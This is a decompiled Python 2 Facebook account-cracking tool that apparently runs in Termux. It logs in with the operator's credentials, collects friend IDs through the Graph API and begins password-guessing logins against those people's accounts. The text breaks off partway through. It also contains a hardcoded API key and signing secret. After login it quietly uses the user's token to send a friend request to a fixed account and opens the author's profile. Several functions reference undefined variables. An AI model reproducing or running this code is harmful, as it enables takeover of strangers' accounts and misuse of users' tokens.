# Decompiled By mohammad sultani
# Github : https://github.com/mohammadjan1122
#!/usr/bin/python2
#coding=utf-8
# Developer By fucked_abm

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "Exit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)


#Dev:fucked  A B M 
logo = """ 


  GitHub      : https://github.com/Mohammadjan1122
 YouTube     : Termux Master
 Telegram    : https://t.me/sultani1122
 Blogspot    : https://mohammadsultani.blogspot.com
--------------------------------------------------

                                   
  fucked  A B M 
  
  
  
  DECOMPILED BY  MOHAMMAD SULTANI 
"""
logo2 = """
\033[1;92m
0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v    d     a   u    k   i     j   u     y   i   j  s   r   5   k
1  4   7   8   8   9  0 b  9 5 d 0  9  4   8 s 8   2  80    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8   
a   v       0    1    0   9    1   6    7   8   3   5   7   1   8  3   0  
   1    9   5    0    2   8   6   1   3   0   1   9   0   8        """

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo2
	os.system('clear')
	print logo
        print("\033[1;97m--------------------------------------------------")
	print "\033[1;94m[1]\033[1;91m\033[1;96mLogin With User And Pass  "
	time.sleep(0.05)
        print "\033[1;94m[2]\033[1;91m>\033[1;96mLogin With Token "
	time.sleep(0.05)
	print "\033[1;94m[0]\033[1;91m>\033[0;90mLogout        "
	time.sleep(0.05)
        print("\033[1;97m--------------------------------------------------")
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[0;90mfucked_abm\033[1;94m>\033[1;92m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
			
			
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		jalan(' \033[1;97m[_>_]\033[1;93mDo Not Use Your Personal Account\033[1;97m[_>_]' )
		jalan(' \033[1;97m[_>_]\033[1;93mUse a New Account To Login\033[1;97m[_>_]' )
		jalan(' \033[1;97m[_>_]\033[1;93mUse Any Proxy To Login Account\033[1;97m[_>_]' )                 
		print("\033[1;97m--------------------------------------------------")
		print("\033[1;97m   >>>>>>\033[1;93m Developer By fucked_abm \033[1;97m>>>>>>") 
		print("\033[1;97m--------------------------------------------------")
		id = raw_input('\033[1;97m[_>_] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[_>_] \x1b[1;91mEnter Password \x1b[1;91m: \x1b[1;93m')
		print("\033[1;97m--------------------------------------------------")
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;92mLogin Successful :)' 
				os.system('xdg-open https://m.facebook.com/mohammad.hacker.1122')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

def tokenz():
	os.system('clear')
	print logo2
	os.system('clear')
	print logo
	print("\033[1;97m--------------------------------------------------")
	print("\033[1;97m>>>>>>\033[1;93m Token Not Found Problem Fix \033[1;97m>>>>>>\033[1;0m")
	print("\033[1;97m>>>>>>\033[1;93mUse Any proxy To Give Token Here\033[1;97m>>>>>>\033[1;0m")
	print("\033[1;97m   >>>>>>\033[1;93m Developer By fucked_abm \033[1;97m>>>>>>\033[1;0m") 
	print("\033[1;97m--------------------------------------------------")
	toket = raw_input("\033[1;91m[>>]\033[1;92m Enter Token \033[1;91m :\033[1;93m ")
	print("\033[1;97m--------------------------------------------------")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system('clear')
	print logo2
	os.system('clear')
	print logo
        print "  \033[1;36;40m\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m"                               
	print "  \033[1;36;40m\033[1;32;40m[*] ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
	print "  \033[1;36;40m\033[1;32;40m[*] Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
	print("\033[1;97m--------------------------------------------------")
	time.sleep(0.05)
	print("\033[1;92m1>\033[1;93m>>\033[1;94mClones All Country With Choice Password \033[1;93m>>") 
	time.sleep(0.05)
	print("\033[1;97m--------------------------------------------------")
	print "\033[1;32;98m[01]\033[1;96m>\033[1;93mCrack From Pakistan Menu "
        time.sleep(0.05)	
	print "\033[1;32;98m[02]\033[1;96m>\033[1;93mCrack From Bangladesh Menu "
        time.sleep(0.05)	
	print "\033[1;32;98m[03]\033[1;96m>\033[1;93mCrack From Indonesia Menu "	
	time.sleep(0.05)
	print "\033[1;32;98m[04]\033[1;96m>\033[1;93mCrack From Follower Menu "	
	time.sleep(0.05)
	print "\033[1;32;98m[05]\033[1;96m>\033[1;93mCrack From Username Menu "	
	time.sleep(0.05)
	print "\033[1;32;98m[06]\033[1;96m>\033[1;93mUpdate Tools "	
        time.sleep(0.05) 
	print("\033[1;97m--------------------------------------------------")
	time.sleep(0.05)	
        print("\033[1;92m2>\033[1;93m>>\033[1;94mClones All Country Without Choice Password\033[1;93m>>") 
        time.sleep(0.05)	
        print("\033[1;97m--------------------------------------------------")
        time.sleep(0.05)	
	print "\033[1;32;98m[07]\033[1;96m>\033[1;93mCrack From Pakistan Menu "
        time.sleep(0.05)	
	print "\033[1;32;98m[08]\033[1;96m>\033[1;93mCrack From Bangladesh Menu "
        time.sleep(0.05)	
	print "\033[1;32;98m[09]\033[1;96m>\033[1;93mCrack From Indonesia Menu "	
	time.sleep(0.05)
	print "\033[1;32;98m[10]\033[1;96m>\033[1;93mCrack From Follower Menu "	
	time.sleep(0.05)
	print "\033[1;32;98m[11]\033[1;96m>\033[1;93mCrack From Username Menu "	
	time.sleep(0.05)
	print "\033[1;32;98m[12]\033[1;96m>\033[1;93mUpdate Tools "	         
	time.sleep(0.05) 
        print "\033[1;32;98m[00]\033[1;96m>\033[1;94mLog out"
	time.sleep(0.05)	
        print("\033[1;97m--------------------------------------------------")
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers == '1' or unikers == '01':
		super()
	elif unikers == '2' or unikers == '02':
		duper()
	elif unikers == '3' or unikers == '03':
		zuper()
	elif unikers == '4' or unikers == '04':
		crack_follow()
	elif unikers == '5' or unikers == '05':
		user_id()	
	elif unikers == '6' or unikers == '06':
		os.system('clear')
		print logo
		print "\033[1;95m----------------\033[1;91mUpdate-tools\033[1;95m--------------"
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
		time.sleep(5)
                print("\033[1;91mCongratulation Tools Has Been Update Successfully")
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers == '7' or unikers == '07':
		fuper()
	elif unikers == '8' or unikers == '08':
		kuper()
	elif unikers == '9' or unikers == '09':
		indoo()
	elif unikers == '10':
		follow()
	elif unikers =="11":
		user_us()
	elif unikers == '12':
		os.system('clear')
		print logo
		print "\033[1;95m----------------\033[1;91mUpdate-tools\033[1;95m--------------"
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
		time.sleep(5)
                print("\033[1;91mCongratulation Tools Has Been Update Successfully")
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()	
	elif unikers == '0' or unikers == '00':
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo2
	os.system('clear')
	print logo
	print("\033[1;97m--------------------------------------------------")
	jalan( "\x1b[1;32;92m[1]\033[1;33;98m>\033[1;94mCrack From Friendlist With Choice Password ") 
	jalan( "\x1b[1;32;92m[2]\033[1;33;98m>\033[1;94mCrack From Any Public With Choice Password") 
	jalan( "\x1b[1;32;36m[0]\033[1;33;96m>\033[1;91mBack") 
	print("\033[1;97m--------------------------------------------------")
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system("clear")
		print logo
		print("\033[1;97m--------------------------------------------------")
		time.sleep(0.05)
		print ("\033[1;93m For Example :\033[1;92m 786786,Pakistan, Pakistan123") 
		time.sleep(0.05)
		print("\033[1;97m--------------------------------------------------")
		pass1=raw_input("\033[1;96m[1]\033[1;94m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		pass2=raw_input("\033[1;96m[2]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		pass3=raw_input("\033[1;96m[3]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		print("\033[1;97m--------------------------------------------------")
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z["data"]:
			id.append(s["id"])
	elif peak =="2":
		os.system("clear")
		print logo
		idt = raw_input("\033[1;94m[ok] Enter ID/Username :\033[1;92m ")
		print("\033[1;97m--------------------------------------------------")
		time.sleep(0.05)
		print ("\033[1;93m For Example :\033[1;92m 786786,Pakistan, Pakistan123") 
		time.sleep(0.05)
		print("\033[1;97m--------------------------------------------------")
		pass1=raw_input("\033[1;96m[1]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		pass2=raw_input("\033[1;96m[2]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		pass3=raw_input("\033[1;96m[3]\033[1;93m Input Password  :\033[1;94m ")
		time.sleep(0.05)
		print("\033[1;97m--------------------------------------------------")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("\033[1;96m[>>] Account  Name: "+op["name"])
			time.sleep(0.5)
		except KeyError:
			print("\033[1;91m[!] ID Not Found!")
			raw_input("\n\033[1;92mPress Enter To Back ")
			choice1()
		print"\033[1;35;40m[>>] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	
	print "\033[1;36;96m[>>] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[>>] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		    print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  >-------\x1b[1;91mTo Stop Process Press CTRL+Z\033[1;97m------>"
	print "\033[1;97m >------------------------------------------------>"
	jalan('  \033[1;93m  Plz Wait Cloned Accounts Will Appear Here')
	jalan('  \033[1;93m               Crack Pakistan ')
        print "\033[1;97m >------------------------------------------------>"
	
	def main(arg):
		global cpb,oks
		user = arg
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
